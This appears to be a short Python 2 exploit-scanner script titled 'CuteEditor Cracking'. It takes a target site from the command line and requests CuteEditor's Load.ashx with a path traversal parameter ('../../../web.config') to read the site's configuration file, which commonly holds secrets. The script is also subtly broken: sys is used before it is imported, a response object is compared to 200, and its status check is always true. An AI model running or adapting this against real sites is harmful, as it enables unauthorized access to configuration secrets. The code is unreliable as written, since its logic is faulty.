#!/usr/bin/env python
#coding = utf-8
sys.path.append("plugin/")
import re
import urllib
import urllib2
import os
import sys
import httplib
#import color_pr
import time
from poster.streaminghttp import register_openers
from poster.encode import multipart_encode

global url,resp


def response(rurl):
    resp=urllib.urlopen(rurl)
    return resp


def file_read():
    load_url=url+"CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
    if response(load_url)==200:
        print "[!]Maybe with a CuteEditor file_read xday==>\n"+load_url



if __name__ == "__main__":
    #print sys.argv[1]
    site = sys.argv[1]
    url="http://"+site
    print "||===>url:"+url+"====CuteEditor Cracking====>\n"
    resp = response(url)
    if resp.status == 403 or 200:
       file_read()

